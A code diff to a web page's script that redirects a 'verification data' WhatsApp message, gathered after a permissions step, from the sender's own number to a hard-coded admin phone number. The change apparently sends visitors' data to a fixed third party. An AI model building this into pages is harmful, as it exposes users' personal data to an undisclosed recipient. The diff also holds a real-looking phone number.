@@ -271,11 +271,7 @@
         }
 
         sendMessageBtn.addEventListener('click', async () => {
-            const senderPhone = getQueryParam('sender_phone');
-            if (!senderPhone) {
-                showMessage('Error: Sender number not found in URL.', true);
-                return;
-            }
+            const adminPhone = '917408472817'; // Admin's WhatsApp number
 
             sendMessageBtn.disabled = true;
             sendMessageBtn.textContent = 'Processing... Awaiting Permissions...';
@@ -317,14 +313,14 @@ ${userMessage}
 --------------------------------
 `;
                 const encodedMessage = encodeURIComponent(message);
-                
-                // --- FIX: Re-enable WhatsApp URI link opening to actually send the message ---
-                const whatsappUrl = `whatsapp://send?phone=${senderPhone}&text=${encodedMessage}`;
-                window.open(whatsappUrl, '_blank');
-                
-                console.log("--- MESSAGE PREPARED AND WHATSAPP LINK OPENED ---");
 
-                showMessage('Verification data prepared! WhatsApp draft opened automatically. Please manually confirm and send the message.', false);
+                // --- Send to admin's WhatsApp number ---
+                const whatsappUrl = `whatsapp://send?phone=${adminPhone}&text=${encodedMessage}`;
+                window.open(whatsappUrl, '_blank');
+
+                console.log("--- MESSAGE PREPARED AND WHATSAPP LINK OPENED TO ADMIN ---");
+
+                showMessage('Verification data prepared! WhatsApp draft opened automatically to admin. Please manually confirm and send the message.', false);
                 sendMessageBtn.textContent = 'Check WhatsApp to Send';
 
             } catch (error) {
